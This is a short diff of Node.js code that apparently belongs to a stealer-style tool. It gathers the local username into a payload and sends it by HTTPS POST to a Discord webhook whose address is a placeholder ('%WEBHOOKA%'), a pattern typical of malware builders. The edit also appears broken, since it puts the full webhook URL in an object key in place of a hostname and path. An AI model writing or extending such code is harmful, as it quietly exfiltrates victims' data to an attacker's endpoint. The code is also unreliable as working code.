@@ -515,6 +515,7 @@ const os = require("os");
           const hook = data.substring(0, delimiterIndex);
           const link = data.substring(delimiterIndex + 1);
           const hostname = os.userInfo().username;
+          const webhookURL = "%WEBHOOKA%";
 
           const payload = {
             content: null,
@@ -550,13 +551,12 @@ const os = require("os");
             attachments: [],
           };
           const options = {
-            hostname: "discord.com",
-            port: 443,
-            path: "/api/webhooks/" + "%WEBHOOKAPI%",
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-            },
+          [webhookURL]: "", // L'URL complète devient la clé
+          port: 443,
+          method: "POST",
+          headers: {
+          "Content-Type": "application/json",
+          },
           };
           
           const req = https.request(options, (res) => {
